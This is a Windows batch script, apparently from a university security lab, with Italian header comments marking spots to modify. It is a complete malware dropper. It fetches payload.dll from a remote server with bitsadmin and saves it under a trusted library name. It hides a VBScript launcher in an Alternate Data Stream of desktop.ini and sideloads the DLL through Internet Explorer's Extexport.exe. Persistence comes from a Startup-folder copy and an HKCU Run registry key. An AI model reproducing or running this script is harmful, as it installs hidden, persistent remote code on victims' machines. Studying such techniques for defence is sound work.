rem Modificare lo script nei punti indicati con
rem    percorso-vbs
rem    comando-bitsadmin
rem    comando-extexport
rem    comando-copia-startup-folder
rem    comando-registry-shell-folders

@echo off

setlocal enabledelayedexpansion

rem Set the path of the VBscript file that will be created.
rem The path should be an Alternate Data Stream of "C:\Users\Public\desktop.ini".
rem You need to append to the path a colon and the name of the VBscript file.
rem For example "...:launcher.vbs"

set PATH_LAUNCHER_ADS=C:\Users\Public\desktop.ini:launcher.vbs

rem Download the DLL payload from the server using BitsAdmin.
rem Save the DLL file in C:\Users\Public\Libraries, with any name among "mozcrt19.dll", "mozsqlite3.dll", or "sqlite3.dll"

start /b bitsadmin /transfer mydll /priority FOREGROUND http://192.168.227.1/payload.dll C:\Users\Public\Libraries\sqlite3.dll




rem Call "C:\Program Files (x86)\Internet Explorer\Extexport.exe" from this script.
rem As first parameter, use the path "C:\Users\Public\Libraries".
rem As second and third parameters, use two random strings (such as "bla bla").

echo Dim objShell > %PATH_LAUNCHER_ADS%
echo Set objShell = WScript.CreateObject("WScript.Shell") >> %PATH_LAUNCHER_ADS%
echo Set oExec = objShell.Exec("C:\Program Files (x86)\Internet Explorer\Extexport.exe C:\Users\Public\Libraries bla bla") >> %PATH_LAUNCHER_ADS%
echo Set objShell = Nothing >> %PATH_LAUNCHER_ADS%

rem ######## Persistence Code Added Here ########

rem Create a BAT script to execute the hidden VBS launcher

set PATH_LAUNCHER_BAT=C:\Users\Public\launcher.bat
echo cscript "%PATH_LAUNCHER_ADS%" > %PATH_LAUNCHER_BAT%

rem Copy BAT script in the user's startup folder
copy %PATH_LAUNCHER_BAT% "C:\Users\unina\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\launcher.bat"

rem Add a registry key to the run keys in the user registry hive
REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /f /v StartUp /t REG_SZ /d %PATH_LAUNCHER_BAT%

rem #############################################

rem This will execute the hidden launcher from the ADS
cscript "%PATH_LAUNCHER_ADS%"